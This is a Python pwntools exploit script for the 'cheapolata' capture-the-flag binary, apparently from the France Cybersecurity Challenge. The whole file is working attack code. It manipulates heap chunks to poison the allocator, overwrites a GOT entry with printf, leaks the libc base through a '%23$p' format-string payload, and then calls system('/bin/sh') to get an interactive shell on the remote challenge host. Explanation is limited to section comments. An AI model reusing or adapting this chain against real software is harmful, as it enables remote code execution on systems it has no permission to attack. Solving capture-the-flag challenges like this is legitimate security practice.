#!/usr/bin/python3.9
from pwn import *

context.terminal = '/usr/bin/kitty'

if not args.BLIND:
    context.binary = elfexe = ELF('./cheapolata') #FIXME
    libc = ELF('./libc-2.27.so') #FIXME

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    elf_path = elfexe.path
    if args.REMOTE:
        remote_server = 'challenges.france-cybersecurity-challenge.fr'   #FIXME
        remote_port = 2106         #FIXME

        if args.SSH:
            s = ssh('app-systeme-ch8', remote_server, remote_port, 'app-systeme-ch8')
            if args.GDB:
                if not args.BLIND:
                    return gdb.debug([elf_path] + argv, gdbscript, elfexe.path, ssh=s, *a, *kw)
                else:
                    return gdb.debug([elf_path] + argv, gdbscript, ssh=s, *a, *kw)
            else:
                target = s.process([elf_path] + argv, *a, **kw)
        else:
            target = remote(remote_server, remote_port)
    else:
        if args.GDB:
            if not args.BLIND:
                return gdb.debug([elf_path] + argv, gdbscript, elfexe.path, *a, *kw)
            else:
                return gdb.debug([elf_path] + argv, gdbscript, *a, *kw)
        else:
            target = process([elf_path] + argv, *a, **kw)
    return target

gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

# b *printf
# b *main+152
# b *main+256
#b *read_string
#b *read_long
# command
#     printf "argv ptr: %p\\n",$rsi
# end

# continue
'''.format(**locals())
if args.GDB:
    log.info('Using gdb script:\n'+gdbscript)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


arguments = []
io = start(arguments)

#############################################
### Prepare Libc Leak CHUNK
io.send(b'0001')
io.send(b'0032')
io.send(b'A'*0x20)

io.send(b'0002')

io.send(b'0002')

io.send(b'0001')
io.send(b'0032')
io.send(p64(0x602020-0x18)+b'B'*0x18)

io.send(b'0001')
io.send(b'0032')
io.send(b'C'*0x20)
#############################################

#############################################
### Prepare binsh and system hijacking CHUNK
io.send(b'0001')
io.send(b'0000')

io.send(b'0002')
io.send(b'0002')

io.send(b'0001')
io.send(b'0024')
io.send(p64(0x602020-0x08)+b'B'*0x10)

io.send(b'0001')
io.send(b'0024')
io.send(b'C'*0x18)
#############################################

#############################################
### Leak Libc
io.send(b'0001')
io.send(b'0032')
io.send(b'%23$p...'+p64(0x0)*2+p64(elfexe.sym['printf']))

io.send(b'0002')

data = io.recvuntil(b'...')[-15:-3]
data = int(data, 16)
libc.address = data-0x21b97
print("LIBC Leak:", hex(data))
#############################################

#############################################
### jump to system(binsh)
io.send(b'0001')
io.send(b'0024')
io.send(b'/bin/sh\x00'+p64(libc.sym['system'])+b'B'*0x08)

io.send(b'0002')
#############################################

io.interactive()
io.close()
